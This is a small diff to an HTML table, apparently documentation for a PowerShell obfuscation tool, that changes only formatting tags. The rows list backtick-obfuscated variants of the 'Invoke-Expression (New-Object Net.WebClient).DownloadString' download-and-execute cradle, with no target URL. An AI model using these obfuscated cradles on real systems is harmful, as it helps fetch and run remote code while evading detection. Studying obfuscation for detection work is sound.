@@ -56,11 +56,11 @@ you can copy the results from all cases for one or more obfuscation methods and 
    <p>TOKEN\ARGUMENT\2</p>
   </td>
   <td nowrap>
-   <u>TOKEN\COMMAND\1</u>
+   <strong>TOKEN\COMMAND\1</strong>
    <p>IN`V`o`Ke-eXp`ResSIOn (Ne`W-ob`ject Net.WebClient).DownloadString</p>
    <p>IN`V`OKE-exPRE`Ss`i`oN (n`eW-O`BjECT Net.WebClient).DownloadString</p>
    <p>IN`VOke-expr`eSS`ioN (NE`w-`o`BjECt Net.WebClient).DownloadString</p>
-   <u>TOKEN\ARGUMENT\2</u>
+   <strong>TOKEN\ARGUMENT\2</strong>
    <p>Invoke-Expression (New-Object n`eT.Web`Clie`Nt).DownloadString</p>
    <p>Invoke-Expression (New-Object Ne`T.WEb`CLIe`Nt).DownloadString</p>
    <p>Invoke-Expression (New-Object n`ET.w`E`BCLIEnt).DownloadString</p>
